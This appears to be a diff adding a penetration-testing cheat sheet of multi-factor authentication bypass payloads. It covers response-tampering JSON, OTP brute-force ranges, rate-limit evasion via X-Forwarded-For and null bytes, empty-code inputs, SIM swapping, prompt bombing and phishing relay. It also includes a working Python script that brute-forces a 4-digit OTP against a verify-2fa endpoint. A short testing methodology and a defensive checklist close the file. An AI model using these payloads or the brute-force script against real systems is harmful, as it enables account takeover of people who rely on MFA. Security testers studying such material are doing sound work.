@@ -1,0 +1,395 @@
+# MFA (Multi-Factor Authentication) Bypass Payloads
+
+## ========================================
+## RESPONSE MANIPULATION
+## ========================================
+
+# Change response to success
+{"mfa_required": false}
+{"mfa_valid": true}
+{"2fa_verified": true}
+{"authenticated": true}
+
+# Status code manipulation
+302 redirect to dashboard
+200 OK even with wrong code
+
+## ========================================
+## BRUTE FORCE
+## ========================================
+
+# 4-digit PIN
+0000-9999 (10,000 combinations)
+
+# 6-digit OTP
+000000-999999 (1,000,000 combinations)
+
+# Common codes
+123456
+000000
+111111
+654321
+123123
+
+## ========================================
+## RATE LIMITING BYPASS
+## ========================================
+
+# IP rotation
+Use different IPs per request
+X-Forwarded-For: random_ip
+
+# Session rotation
+Create new session per attempt
+
+# Null byte
+code=1234%00
+
+## ========================================
+## MISSING 2FA ON CRITICAL FUNCTIONS
+## ========================================
+
+# Test without 2FA
+/api/change-password (no 2FA)
+/api/change-email (no 2FA)
+/api/add-admin (no 2FA)
+/api/transfer-funds (no 2FA)
+
+## ========================================
+## BACKUP CODE ABUSE
+## ========================================
+
+# Predictable backup codes
+Sequential: 12345678, 12345679
+MD5(email): hash values
+Timestamp-based codes
+
+# Unlimited generation
+Generate infinite backup codes
+
+# Reusable codes
+Use same backup code multiple times
+
+## ========================================
+## CODE REUSE
+## ========================================
+
+# Reuse old codes
+Store valid code, use again
+
+# Session replay
+Replay authentication session
+
+# Token reuse
+Reuse authentication token
+
+## ========================================
+## OAUTH/SOCIAL LOGIN BYPASS
+## ========================================
+
+# Skip 2FA on OAuth
+Login via Google/Facebook skips 2FA
+
+# Link account without 2FA
+Link social account bypasses 2FA
+
+## ========================================
+## DIRECT REQUEST
+## ========================================
+
+# Skip 2FA page
+POST /login (username, password)
+Then: GET /dashboard (skip /verify-2fa)
+
+# Direct API access
+Skip web UI 2FA by using API
+
+## ========================================
+## PASSWORD RESET BYPASS
+## ========================================
+
+# Reset without 2FA
+/forgot-password doesn't require 2FA
+
+# Disable 2FA via reset
+Reset password disables 2FA
+
+## ========================================
+## TIME-BASED BYPASS
+## ========================================
+
+# Code not expiring
+Use old OTP code
+
+# Extended validity
+Code valid for hours
+
+# Time manipulation
+Change system time
+
+## ========================================
+## CODE SHARING
+## ========================================
+
+# Same code for multiple users
+Code not user-specific
+
+# Predictable generation
+Codes generated sequentially
+
+## ========================================
+## REMEMBER ME BYPASS
+## ========================================
+
+# Long-lived remember tokens
+"Remember me" skips 2FA
+
+# Token doesn't require re-verification
+
+## ========================================
+## SMS/EMAIL INTERCEPTION
+## ========================================
+
+# SIM swapping
+Take over phone number
+
+# Email account takeover
+Compromise email account
+
+# SS7 attacks
+Intercept SMS messages
+
+## ========================================
+## PARAMETER MANIPULATION
+## ========================================
+
+# Skip verification
+{"verify_2fa": false}
+{"2fa_required": 0}
+
+# Wrong user context
+{"user_id": "other_user"}
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Test rate limiting
+- How many attempts allowed?
+- Can it be bypassed?
+
+# 2. Test code validity
+- How long is code valid?
+- Can codes be reused?
+
+# 3. Test critical functions
+- Which operations need 2FA?
+- Can they be accessed without it?
+
+# 4. Test backup codes
+- Are they predictable?
+- Can they be regenerated?
+
+# 5. Test OAuth flow
+- Does OAuth skip 2FA?
+
+## ========================================
+## AUTOMATION EXPLOITS
+## ========================================
+
+# Brute force script
+import requests
+
+url = "http://target.com/verify-2fa"
+cookies = {"session": "valid_session"}
+
+for code in range(10000):
+    otp = str(code).zfill(4)
+    data = {"otp": otp}
+    r = requests.post(url, data=data, cookies=cookies)
+    if "success" in r.text.lower():
+        print(f"Valid code: {otp}")
+        break
+
+## ========================================
+## NULL/EMPTY VALUES
+## ========================================
+
+# Empty code
+{"otp": ""}
+{"code": null}
+
+# Missing parameter
+Don't send OTP parameter at all
+
+## ========================================
+## INFORMATION DISCLOSURE
+## ========================================
+
+# Error messages reveal info
+"Invalid code" vs "Account locked"
+"Code expired" vs "Wrong code"
+
+# Timing attacks
+Valid code: 200ms
+Invalid code: 50ms
+
+## ========================================
+## TOKEN THEFT
+## ========================================
+
+# Steal TOTP secret
+QR code contains secret
+Backup secret in plaintext
+
+# Session hijacking
+Steal session after 2FA
+
+## ========================================
+## CLICKJACKING
+## ========================================
+
+# Click to approve 2FA
+<iframe> overlay on approval page
+User clicks "approve" unknowingly
+
+## ========================================
+## PHISHING
+## ========================================
+
+# Real-time relay
+Proxy authentication requests
+Steal OTP from victim
+
+# MFA prompt bombing
+Send many push notifications
+User approves by mistake
+
+## ========================================
+## IMPLEMENTATION FLAWS
+## ========================================
+
+# Client-side validation
+JavaScript checks OTP
+Bypass by modifying code
+
+# Weak random generation
+Predictable TOTP seeds
+Sequential backup codes
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Pattern 1: Optional 2FA
+if (user.has_2fa_enabled) {
+  verify_2fa();
+}
+// Bypass: Disable 2FA
+
+# Pattern 2: Client check
+if (clientSays2FAValid) {
+  grant_access();
+}
+
+# Pattern 3: Missing on API
+Web UI has 2FA
+API endpoints don't
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Direct access
+1. Login with credentials
+2. Skip 2FA page
+3. Direct to /dashboard
+
+# Example 2: Response manipulation
+1. Enter wrong OTP
+2. Intercept response
+3. Change {"valid": false} to {"valid": true}
+
+# Example 3: Brute force
+1. Valid session after password
+2. Brute force 4-digit PIN
+3. No rate limiting
+
+## ========================================
+## PUSH NOTIFICATION BYPASS
+## ========================================
+
+# Notification fatigue
+Send multiple push requests
+User approves to stop notifications
+
+# Social engineering
+Convincing support to disable 2FA
+
+## ========================================
+## RECOVERY CODE ISSUES
+## ========================================
+
+# Weak generation
+md5(username + timestamp)
+Sequential numbers
+
+# No rate limiting
+Brute force recovery codes
+
+# Disclosure
+Codes in URL parameters
+Codes in logs
+
+## ========================================
+## API BYPASS
+## ========================================
+
+# Mobile API
+Mobile app doesn't enforce 2FA
+
+# Legacy endpoints
+Old API version without 2FA
+
+# Different authentication flow
+Different flow skips 2FA
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- Intercept 2FA requests
+- Modify responses
+- Test rate limiting
+
+# Custom scripts
+- Brute force OTP
+- Test bypass methods
+
+# Selenium
+- Automate 2FA testing
+
+## ========================================
+## COMMON ENDPOINTS
+## ========================================
+
+/verify-2fa
+/validate-otp
+/check-code
+/2fa/verify
+/mfa/validate
+/totp/verify
+
+## ========================================
+## CHECKLIST
+## ========================================
+
+- [ ] Rate limiting on OTP attempts
+- [ ] Code expiration
+- [ ] Code reuse prevention
+- [ ] 2FA on all critical operations
+- [ ] Backup code security
+- [ ] No client-side validation
+- [ ] Protected against brute force
+- [ ] Session invalidation on 2FA change
